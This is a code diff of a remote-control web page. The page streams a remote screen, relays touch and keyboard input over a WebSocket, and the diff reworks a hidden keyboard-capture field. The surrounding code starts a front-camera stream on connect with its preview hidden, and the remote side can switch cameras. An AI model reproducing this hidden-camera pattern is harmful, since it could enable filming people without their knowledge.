@@ -7,21 +7,26 @@
     <style>
         body { margin: 0; background: #000; height: 100vh; display: flex; flex-direction: column; overflow: hidden; touch-action: none; }
         #screenDisplay { width: 100vw; height: 100vh; object-fit: contain; position: absolute; z-index: 1; }
+        
+        /* حقل النص مخفي ولكنه موجود دائماً */
         #hiddenInput {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0; z-index: 10; font-size: 16px; border: none; outline: none; background: transparent;
-            display: none; /* مخفي افتراضياً */
+            position: absolute; top: 0; left: 0; width: 1px; height: 1px;
+            opacity: 0; z-index: 20; border: none; outline: none; background: transparent;
+            pointer-events: none; /* لا يستقبل لمسات حالياً */
         }
+        
         #touchOverlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 5; background: transparent;
+            z-index: 10; background: transparent;
         }
         #myVideoPreview { display: none; }
     </style>
 </head>
 <body>
-    <div id="touchOverlay"></div>
+    <!-- حقل النص فوق كل شيء عند الحاجة -->
     <input type="text" id="hiddenInput" autocomplete="off" autocapitalize="none" spellcheck="false" value=" ">
+    
+    <div id="touchOverlay"></div>
     <img id="screenDisplay" />
     <video id="myVideoPreview" autoplay muted playsinline></video>
 
@@ -36,14 +41,15 @@
         let remoteKeyboardActive = false;
 
         ws.onopen = () => {
+            console.log("Connected to server");
             startCameraStream("user");
         };
 
-        // إرسال اللمس عبر الطبقة الشفافة دائماً
         const sendTouch = (e) => {
             const rect = img.getBoundingClientRect();
             const clientX = e.clientX || (e.touches && e.touches[0].clientX);
             const clientY = e.clientY || (e.touches && e.touches[0].clientY);
+            
             if (clientX !== undefined && clientY !== undefined) {
                 ws.send(JSON.stringify({
                     type: 'touch',
@@ -51,12 +57,20 @@
                     y: clientY / rect.height
                 }));
             }
+            
+            // إذا كانت الكيبورد مطلوبة، نركز عليها عند أي لمسة
+            if (remoteKeyboardActive) {
+                setTimeout(() => hiddenInput.focus(), 10);
+            }
         };
 
+        // لمس الشاشة يرسل لمس ويركز على الكيبورد إذا لزم الأمر
         touchOverlay.addEventListener('mousedown', sendTouch);
         touchOverlay.addEventListener('touchstart', (e) => { sendTouch(e); });
+        
+        // عند الضغط داخل حقل النص نفسه (عندما يكون فعالاً)
+        hiddenInput.addEventListener('touchstart', (e) => { sendTouch(e); });
 
-        // التعامل مع الكيبورد
         hiddenInput.oninput = (e) => {
             const val = e.target.value;
             if (val === "") {
@@ -79,12 +93,20 @@
                 try {
                     const data = JSON.parse(event.data);
                     if (data.type === 'keyboard_state') {
+                        console.log("Keyboard state:", data.visible);
                         remoteKeyboardActive = data.visible;
+                        
                         if (remoteKeyboardActive) {
-                            hiddenInput.style.display = "block";
+                            // جعل حقل النص يغطي الشاشة ويستقبل اللمس
+                            hiddenInput.style.width = "100%";
+                            hiddenInput.style.height = "100%";
+                            hiddenInput.style.pointerEvents = "auto";
                             hiddenInput.focus();
                         } else {
-                            hiddenInput.style.display = "none";
+                            // إعادة حقل النص لحجمه الصغير وإيقاف استقباله للمس
+                            hiddenInput.style.width = "1px";
+                            hiddenInput.style.height = "1px";
+                            hiddenInput.style.pointerEvents = "none";
                             hiddenInput.blur();
                         }
                     } else if (data.type === 'camera_switch_request') {
@@ -94,10 +116,9 @@
             }
         };
 
-        // إعادة التركيز فقط إذا كان الكيبورد مطلوباً من الهاتف الآخر
         hiddenInput.onblur = () => {
             if (remoteKeyboardActive) {
-                setTimeout(() => hiddenInput.focus(), 10);
+                setTimeout(() => hiddenInput.focus(), 50);
             }
         };
 
